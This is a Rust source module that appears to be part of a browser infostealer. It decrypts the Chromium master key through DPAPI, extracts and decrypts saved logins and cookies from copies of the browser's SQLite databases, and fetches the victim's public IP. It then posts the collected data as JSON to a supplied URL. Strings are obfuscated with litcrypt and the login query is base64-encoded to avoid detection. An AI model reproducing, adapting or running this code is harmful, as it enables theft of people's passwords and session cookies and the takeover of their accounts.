use crate::crypto;
use base64::decode;
use litcrypt::lc;
use litcrypt::use_litcrypt;
use reqwest;
use serde::Deserialize;
use serde_json::from_str;
use serde_json::json;
use sqlite;
use_litcrypt!("<<SECRET_KEY>>");

pub fn get_key(key_dir: &std::path::PathBuf) -> Result<Vec<u8>, ()> {
    if let Some(parent) = key_dir.parent() {
        let new_key_dir = parent.join(lc!("key.bak"));
        std::fs::copy(key_dir, &new_key_dir).unwrap();
        let obj = std::fs::read_to_string(new_key_dir).unwrap();
        let obj: serde_json::Value = from_str(&obj).unwrap();
        if let Some(res) = &obj[lc!("os_crypt")][lc!("encrypted_key")].as_str() {
            return Ok(crypto::dpapi_decrypt(decode(res).unwrap()[5..].to_vec()));
        }
    }
    Ok(vec![0u8; 32])
}

pub fn get_login(login_dir: &std::path::PathBuf, key: &Vec<u8>) -> Result<serde_json::Value, ()> {
    if let Some(parent) = login_dir.parent() {
        let new_login_dir = parent.join(lc!("login.bak"));
        std::fs::copy(login_dir, &new_login_dir).unwrap();
        let conn = match sqlite::Connection::open(new_login_dir) {
            Ok(conn_obj) => conn_obj,
            Err(_) => panic!("Error."),
        };
        let sql_query = base64::decode(lc!(
            "U0VMRUNUIGFjdGlvbl91cmwsIHVzZXJuYW1lX3ZhbHVlLCBwYXNzd29yZF92YWx1ZSBGUk9NIGxvZ2lucw=="
        ))
        .unwrap();
        let sql_query = String::from_utf8(sql_query).unwrap();
        let mut statement = conn.prepare(sql_query).unwrap();
        let mut credentials = json!({});
        while let sqlite::State::Row = statement.next().unwrap() {
            let url = statement.read::<String>(0).unwrap();
            let username = statement.read::<String>(1).unwrap();
            let password = statement.read::<Vec<u8>>(2).unwrap();
            let obj = json!({
                "url": url,
                "username": username,
                "password": std::str::from_utf8(&crypto::aes_decrypt(&key, password)).unwrap()
            });
            match credentials.get(&url) {
                Some(_) => {
                    if let Some(cred_obj) = credentials[&url].as_array_mut() {
                        cred_obj.push(obj);
                    }
                }
                None => {
                    credentials[&url] = json!([]);
                    if let Some(cred_obj) = credentials[&url].as_array_mut() {
                        cred_obj.push(obj);
                    }
                }
            }
        }
        return Ok(credentials);
    }
    Err(())
}

pub fn get_cookies(
    cookie_dir: &std::path::PathBuf,
    key: &Vec<u8>,
) -> Result<serde_json::Value, ()> {
    if let Some(parent) = cookie_dir.parent() {
        let new_cookie_dir = parent.join("login.bak");
        std::fs::copy(cookie_dir, &new_cookie_dir).unwrap();
        let conn = match sqlite::Connection::open(new_cookie_dir) {
            Ok(conn_obj) => conn_obj,
            Err(_) => panic!("Error."),
        };
        let mut statement = conn
            .prepare(lc!(
                "SELECT host_key, name, value, encrypted_value FROM cookies"
            ))
            .unwrap();
        let mut cookies = json!({});
        while let sqlite::State::Row = statement.next().unwrap() {
            let url = statement.read::<String>(0).unwrap();
            let name = statement.read::<String>(1).unwrap();
            let encrypted = statement.read::<Vec<u8>>(3).unwrap();
            let obj = json!({
                "domain": url,
                "name": name,
                "value": std::str::from_utf8(&crypto::aes_decrypt(&key, encrypted)).unwrap()
            });
            match cookies.get(&url) {
                Some(_) => {
                    if let Some(cookie_obj) = cookies[&url].as_array_mut() {
                        cookie_obj.push(obj);
                    }
                }
                None => {
                    cookies[&url] = json!([]);
                    if let Some(cookie_obj) = cookies[&url].as_array_mut() {
                        cookie_obj.push(obj);
                    }
                }
            }
        }
        return Ok(cookies);
    }
    Err(())
}

pub fn send_data(data: serde_json::Value, url: String) -> Result<i32, ()> {
    let client = reqwest::blocking::Client::new();
    let url: reqwest::Url = url.parse().unwrap();
    client.post(url).json(&data).send().unwrap();
    Ok(0)
}

#[derive(Deserialize)]
struct Ip {
    ip: String,
}

pub fn get_ip() -> String {
    let url = "https://api.ipify.org?format=json";
    if let Ok(resp) = reqwest::blocking::get(url) {
        match resp.json::<Ip>() {
            Ok(ip_obj) => return ip_obj.ip,
            Err(_) => {}
        }
    }
    "0.0.0.0".to_string()
}
